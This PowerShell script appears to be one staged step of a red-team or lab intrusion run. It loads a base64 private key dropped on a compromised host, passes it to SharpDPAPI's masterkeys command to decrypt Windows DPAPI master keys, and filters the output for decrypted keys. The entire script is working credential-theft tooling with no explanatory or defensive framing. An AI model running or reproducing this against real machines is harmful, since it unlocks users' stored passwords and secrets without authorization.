# 3.5G step2c payload: SharpDPAPI masterkeys /pvk:<DER base64>
$ErrorActionPreference = 'Continue'
$sdp = 'C:\Windows\Temp\cadre-tools\SharpDPAPI.exe'
$o = 'C:\Windows\Temp\sharpdpapi-out3.txt'

# The base64 is passed as a file content read on mbr01 (staged by runner)
$b64File = 'C:\Windows\Temp\cadre-tools\wt035g-der-b64.txt'
if (Test-Path $b64File) {
    $b64 = (Get-Content $b64File -Raw).Trim()
    Write-Output "DER_B64_LEN $($b64.Length)"
    Remove-Item $o -ErrorAction SilentlyContinue
    & $sdp masterkeys "/pvk:$b64" > $o 2>&1
    Start-Sleep -Seconds 2
    Write-Output "OUT_SIZE $((Get-Item $o -ErrorAction SilentlyContinue).Length)"
    Get-Content $o -ErrorAction SilentlyContinue | Select-String -Pattern 'Found MasterKey|decryption|master key cache|\{|Error|Action|Preferred|Decrypted' | Select-Object -First 45 | ForEach-Object { Write-Output "SDPC|$($_.Line)" }
} else { Write-Output 'B64_FILE_MISSING' }
Write-Output '3.5G_STEP2C_DONE'
